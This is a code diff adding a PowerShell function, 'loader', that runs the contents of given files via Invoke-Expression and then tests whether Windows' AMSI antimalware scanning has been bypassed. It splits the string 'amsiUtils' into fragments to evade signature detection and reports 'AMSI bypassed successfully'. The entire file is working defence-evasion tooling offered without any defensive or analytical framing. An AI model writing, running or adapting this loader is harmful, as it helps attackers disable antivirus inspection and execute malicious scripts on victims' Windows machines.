@@ -1,0 +1,36 @@
+function loader {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string[]]$files
+    )
+
+    foreach ($filePath in $files) {
+        if (-Not (Test-Path $filePath)) {
+            Write-Error "El archivo $filePath no existe."
+            return
+        }
+
+        try{
+            $content = Get-Content -Path $filePath -Raw
+            Invoke-Expression $content -ErrorAction Stop | Out-Null
+        } catch {
+            Write-Host "Error al ejecutar los comandos del archivo $filePath."
+            throw $_.Exception
+        }
+    }
+
+    try {
+        $command = 'am' + 's' + 'I' + 'u' + 'TI' + 'l' + 's'
+
+        Invoke-Expression $command -ErrorAction Stop | Out-Null
+
+        Write-Host "Success: AMSI bypassed successfully."
+
+    } catch {
+        if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
+            Write-Host "Error: AMSI is still active."
+        } else {
+            Write-Host "Success: AMSI bypassed successfully."
+        }
+    }
+}
